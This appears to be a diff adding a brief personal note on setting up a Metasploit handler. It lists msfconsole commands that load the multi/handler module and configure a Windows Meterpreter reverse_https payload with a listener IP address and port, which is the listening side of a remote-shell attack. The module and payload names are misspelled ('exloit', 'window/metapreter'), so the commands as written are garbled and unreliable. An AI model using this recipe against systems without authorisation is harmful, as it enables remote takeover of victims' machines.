@@ -1,0 +1,6 @@
+open metaspoitaable framework using command  msfconsole 
+"use" is a command to use module
+command is:  use exloit/multi/handler
+next command is: set PAYLOAD window/metapreter/reverse_https
+next command is : set LHOST 162.168.218.155
+set LPORT 8080
